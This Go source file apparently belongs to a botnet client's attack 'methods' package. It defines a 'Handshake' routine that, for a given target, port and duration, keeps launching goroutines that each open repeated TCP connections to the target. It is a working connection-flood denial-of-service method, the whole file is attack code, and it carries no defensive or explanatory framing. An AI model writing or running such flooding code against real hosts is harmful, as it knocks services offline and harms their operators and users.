package methods

import (
	"fmt"
	"homo/client/balancer"
	"net"
	"strconv"
	"strings"
	"time"
)

func Handshake(target string, port string, duration string) {

	defer Catch()

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		select {
		case <-balancer.BalanceCh:
		default:
			go handshake(target, port)
			time.Sleep(200 * time.Millisecond)
			go handshake(target, port)
			go handshake(target, port)
		}
	}

}

func handshake(target, port string) {

	defer Catch()

	for i := 0; i < 30; i++ {
		fmt.Println(i)
		dial := net.Dialer{Timeout: 5 * time.Second, LocalAddr: nil, DualStack: false, KeepAlive: 5000}

		addr, err := net.ResolveTCPAddr("tcp", net.JoinHostPort(target, port))

		if err != nil {
			return
		}

		conn, err := dial.Dial("tcp", addr.String())
		if err != nil {
			fmt.Println(err)
			return
		}
		defer conn.Close()
	}
}
